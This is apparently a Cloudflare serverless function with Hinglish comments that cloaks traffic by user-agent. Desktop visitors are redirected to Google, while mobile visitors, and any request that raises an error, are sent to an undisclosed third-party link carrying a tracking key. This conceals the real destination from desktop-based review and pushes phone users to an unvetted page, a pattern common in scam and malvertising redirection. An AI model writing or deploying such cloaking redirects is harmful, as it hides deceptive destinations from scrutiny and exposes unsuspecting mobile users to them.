export async function onRequest(context) {
  try {
    const request = context.request;
    const userAgent = request.headers.get('user-agent') || '';
    
    // Mobile devices ko check karne ka regex
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);

    // 1. Agar user DESKTOP se hai, to use Google par redirect karein
    if (!isMobile) {
      return Response.redirect("https://google.com", 302);
    }

    // 2. Agar user MOBILE se hai, to use is link par redirect karein
    // Is se mobile user ke liye bhi Error 1101 khatam ho jayega
    return Response.redirect("https://craftaggregate.com/y2bxipka?key=19ec0da329890d022c7dab86a665b354", 302);
    
  } catch (error) {
    // Agar koi unexpected error aaye to safe fallback URL par bhej dein
    return Response.redirect("https://craftaggregate.com/y2bxipka?key=19ec0da329890d022c7dab86a665b354", 302);
  }
}
